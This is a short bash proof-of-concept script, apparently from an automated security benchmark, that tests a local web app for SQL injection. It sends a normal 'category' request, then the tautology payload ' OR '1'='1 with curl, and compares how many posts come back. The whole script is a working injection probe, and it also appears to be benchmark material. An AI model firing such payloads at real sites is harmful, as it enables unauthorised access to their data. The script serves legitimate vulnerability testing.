#!/bin/bash
# POC: Demonstrates SQL injection in the category parameter on the homepage. Shows that the category parameter is vulnerable to SQL injection by comparing normal filtering results with SQL injection payload results.
# Target: ./repo
# Created: 2025-11-07T16:16:38.012Z
# Session: benchmark-XBEN-078-24-mhp1edzb

# SQL Injection in Category Parameter POC
# This script demonstrates SQL injection in the category parameter
# by comparing normal filtering results with SQL injection payload results

TARGET_URL="http://localhost:80"

echo "=== SQL Injection in Category Parameter POC ==="
echo ""

# Test 1: Normal request with valid category
echo "[*] Test 1: Normal request with category=Nature"
NORMAL_RESPONSE=$(curl -s "${TARGET_URL}/?category=Nature")
NORMAL_COUNT=$(echo "$NORMAL_RESPONSE" | grep -o "<h2>" | wc -l)
echo "[+] Response contains $NORMAL_COUNT posts for Nature category"
echo ""

# Test 2: SQL Injection payload - OR '1'='1
echo "[*] Test 2: SQL Injection payload: category=' OR '1'='1"
# URL encoded: %27%20OR%20%271%27=%271
INJECTION_RESPONSE=$(curl -s "${TARGET_URL}/?category=%27%20OR%20%271%27=%271")
INJECTION_COUNT=$(echo "$INJECTION_RESPONSE" | grep -o "<h2>" | wc -l)
echo "[+] Response contains $INJECTION_COUNT posts with injection payload"
echo ""

# Analysis
echo "[*] Analysis:"
echo "    - Normal category filter (Nature): $NORMAL_COUNT posts"
echo "    - SQL injection payload (OR '1'='1): $INJECTION_COUNT posts"
echo ""

if [ "$INJECTION_COUNT" -gt "$NORMAL_COUNT" ]; then
    echo "[✓] VULNERABILITY CONFIRMED: SQL Injection detected!"
    echo "    The injection payload bypassed the category filter and returned more posts"
    echo "    This indicates the category parameter is concatenated directly into the SQL query"
    exit 0
else
    echo "[✗] Could not confirm SQL injection"
    exit 1
fi